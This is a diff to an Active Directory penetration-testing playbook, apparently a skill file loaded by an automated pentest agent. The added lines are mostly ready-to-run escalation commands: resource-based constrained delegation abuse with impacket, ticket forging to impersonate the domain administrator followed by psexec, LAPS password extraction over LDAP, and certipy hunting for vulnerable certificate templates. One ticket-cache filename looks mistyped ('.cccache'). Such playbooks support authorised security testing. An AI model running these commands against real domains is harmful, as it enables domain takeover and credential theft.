@@ -1,5 +1,6 @@
 ---
 name: playbook-ad
+tags: [recon, enumeration, exploitation, post_exploit]
 description: Active Directory pentest playbook — Kerberos, LDAP, GPO, ADCS, delegation, lateral movement, DA paths. Load at the START of an AD engagement or when a Windows domain / DC is found. Triggers - domain controller, Kerberos 88, LDAP 389/636, domain SMB, BloodHound, kerberoast, AS-REP, NTLM, ESC1-8.
 ---
 
@@ -71,6 +72,20 @@ evil-winrm -i <target> -u <user> -H <ntlm_hash>
 
 # Unconstrained delegation abuse
 impacket-findDelegation <domain>/<user>:'<pass>' -dc-ip <dc_ip>
+
+# Resource-Based Constrained Delegation (RBCD) — you have GenericWrite/GenericAll on a computer
+# 1. Create/own a machine account, set it as allowed to act for target:
+impacket-rbcd -delegate-to <target$> -dc-ip <dc_ip> -action write '<domain>/<machine$>':'<pass>'
+# 2. S4U2self + S4U2proxy → impersonate DA on that target:
+impacket-getST -spn cifs/<target>.<domain> -impersonate administrator '<domain>/<machine$>':'<pass>'
+export KRB5CCNAME=administrator@<domain>.cccache && impacket-psexec -k -no-pass <domain>/administrator@<target>
+
+# LAPS password read (GenericRead on LAPS attrs) → local admin everywhere the attr is set
+ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<pass>' -b '<base_dn>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
+# gMSA passwords (principal allowed to read) — gMSADumper.py
+
+# ADCS template abuse is the highest-probability escalation in modern AD — see svc-adcs skill FIRST
+certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc_ip> -vulnerable
 
 # ACL abuse (GenericAll, WriteDACL, etc.)
 # Use BloodHound to identify → exploit with PowerView or impacket
